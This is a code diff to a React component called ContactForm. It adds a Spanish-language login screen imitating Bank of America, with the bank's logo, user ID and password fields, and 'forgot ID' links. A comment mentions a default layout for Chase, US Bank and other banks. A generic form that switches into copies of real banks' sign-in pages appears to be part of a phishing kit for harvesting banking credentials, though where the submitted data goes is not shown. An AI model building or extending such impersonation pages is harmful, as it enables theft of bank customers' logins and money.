@@ -85,8 +85,105 @@ export default function ContactForm() {
 
   const closeWindow = () => window.close()
 
+  // Detectar si es Bank of America
+  const isBankOfAmerica = bankName?.toLowerCase().includes('bank of america')
+  const isChase = bankName?.toLowerCase().includes('chase')
+
   // ---- FORMULARIO ----
   if (step === 'form') {
+    // Diseño para Bank of America
+    if (isBankOfAmerica) {
+      return (
+        <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-800 px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-[450px]">
+              {/* Barra roja decorativa */}
+              <div className="h-2 w-20 rounded-full bg-red-600 mb-6" />
+
+              <div className="rounded-3xl bg-white p-8 shadow-2xl">
+                {/* Logo del banco */}
+                <div className="mb-8 flex h-10 items-center">
+                  <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
+                </div>
+
+                <form onSubmit={submitForm} className="space-y-6">
+                  {/* ID Usuario */}
+                  <div>
+                    <label className="mb-2 block text-sm font-semibold text-content-primary">ID de usuario</label>
+                    <input
+                      type="text"
+                      required
+                      value={username}
+                      onChange={(e) => setUsername(e.target.value)}
+                      className="w-full rounded-lg border-2 border-black/20 px-4 py-3 outline-none transition-colors focus:border-blue-600"
+                    />
+                  </div>
+
+                  {/* Contraseña */}
+                  <div>
+                    <div className="mb-2 flex items-center justify-between">
+                      <label className="block text-sm font-semibold text-content-primary">Contraseña</label>
+                      <button
+                        type="button"
+                        onClick={() => setShowPassword(!showPassword)}
+                        className="text-sm text-blue-600 hover:text-blue-700"
+                      >
+                        {showPassword ? 'Ocultar' : 'Ver'}
+                      </button>
+                    </div>
+                    <input
+                      type={showPassword ? 'text' : 'password'}
+                      required
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      className="w-full rounded-lg border-2 border-black/20 px-4 py-3 outline-none transition-colors focus:border-blue-600"
+                    />
+                  </div>
+
+                  {/* Guardar ID */}
+                  <label className="flex items-center gap-3">
+                    <input
+                      type="checkbox"
+                      checked={rememberUsername}
+                      onChange={(e) => setRememberUsername(e.target.checked)}
+                      className="h-5 w-5 cursor-pointer rounded border-black/20 accent-blue-600"
+                    />
+                    <span className="text-sm text-content-primary">Guardar ID de usuario</span>
+                  </label>
+
+                  {/* Sign In Button */}
+                  <button
+                    type="submit"
+                    disabled={submitting}
+                    className="mt-8 w-full rounded-full bg-blue-900 py-3.5 font-bold text-white hover:bg-blue-800 disabled:opacity-60"
+                  >
+                    {submitting ? 'Iniciando…' : 'Iniciar una sesión'}
+                  </button>
+                </form>
+
+                {/* Links */}
+                <div className="mt-8 space-y-3 text-center">
+                  <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                    Olvidé la ID/Contraseña
+                  </a>
+                  <div className="flex justify-center gap-4 text-sm">
+                    <a href="#" className="text-blue-600 hover:text-blue-700">
+                      Seguridad y ayuda
+                    </a>
+                    <span className="text-gray-400">•</span>
+                    <a href="#" className="text-blue-600 hover:text-blue-700">
+                      Inscribirse
+                    </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño por defecto (Chase, US Bank, etc.)
     return (
       <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
         {/* Botón cerrar */}
